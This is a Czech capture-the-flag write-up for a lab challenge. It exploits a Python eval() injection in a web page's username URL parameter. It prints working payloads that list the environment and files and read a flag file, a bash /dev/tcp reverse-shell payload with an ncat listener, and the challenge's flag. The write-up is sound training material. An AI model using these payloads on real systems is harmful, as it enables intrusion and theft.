# Streamlining Portal
Úloha z kategorie *Corporate websites* za 3 body

## Zadání

> Hi, packet inspector,
>
> the AI is preparing some kind of employee streamlining portal on http://user-info.mysterious-delivery.tcc. We fear this will lead to more lost packages.
>
> Your task is to break into the web and find interesting information on the server.
>
> May the Packet be with you!
>
> **Note: Solving this challenge will open 1 new challenge.**

## Nápovědy

> Use VPN to get access to the web.

## Řešení

Jako první je nutné pro vyřešení této úlohy se připojit na The Catch VPN. Bez připojení totiž není možné se připojit k webové stránce.

Na stránce ze zadání se nachází jednoduchá stránka **Welcome Page**, která zdraví uživatele. Jméno uživatele se bere z URL adresy.

Jedna z nejdůležitějších informací o stránce se nachází v headerech, přesněji `Server: gunicorn`. Jedná se o webový server napsaný v jazyce Python, což nám změnšuje okruh potencionálních útoků. Jeden z nejčastějších útoků v Pythonu je zneužití funkce `eval()`. Můžeme tedy vyzkoušet, zda nahrazení jména uživatele v URL adrese nějakým příkazem něco provede. Jako nejzákladnější příkaz lze vyzkoušet sčítání. Místo jména uživatele tedy zadáme `"and 5+5 or"`. Výsledkem je `10`, to znamená tedy, že stránka je zranitelná.

Vyskytují se dvě potencionální cesty, a to:
- Využití Pythonu pro získání flagu
- Vytvoření reverse shellu a získaní flag skrze něj

### Využití Pythonu
První si můžeme zjistit, jaké jsou nastavené proměnné v prostředí, a to příkazem `"and exec('import os') or eval('os.environ') or"`. Zde se nenachází vůbec nic zajímavého, přejdeme tedy k výpisu souborů ve složce běžící aplikace. 

K tomu využijeme příkazu `"and exec('import os') or eval('os.listdir()') or"`. A hele, nachází se zde složka **FLAG**. Zobrazíme si tedy obsah složky **FLAG** příkazem `"and exec('import os') or eval('os.listdir("FLAG")') or"`. 

Ještě zajímavější, je zde soubor `flag.txt`. Teď už stačí jen vypsat obsah souboru, a to skrze příkaz `"and eval('open("FLAG/flag.txt","r").read()') or"`. Výsledkem je hledaný flag.

### Využití reverse shellu
Druhá metoda je reverse shell. Je to o mnoho komfortnější, jelikož se okamžitě dostaneme k celému shellu. Pro využití této možnosti je potřeba mít nainstalovaný `netcat`. 

Jako první si připravíme reverse shell, a to příkzem `ncat -lvp 4444`. Na webu do URL zadáme místo jména uživatele příkaz `"and exec('import subprocess') or exec('subprocess.run(["bash","-c","bash -i &>/dev/tcp/**IP**/4444 <&1"])') or"`, kde **IP** nahradíme naší adresou na VPN, kterou získáme například příkazem `ipconfig`. Následovně se nám v terminálu otevře bash vzdáleného serveru. 

Teď už stačí jen vlézt do složky **FLAG** příkazem `cd FLAG` a vypsat flag pomocí příkazu `cat flag.txt`.

## Flag
`FLAG{OONU-Pm7V-BK3s-YftK}`

## Další užitečné odkazy

- **Command Injection** *(podrobné vysvětlení zranitelnosti)* - https://www.stackhawk.com/blog/command-injection-python/
- **Netcat Reverse Shell** *(podrobné vysvětlení reverse shellu skrze nástroj netcat)* - https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/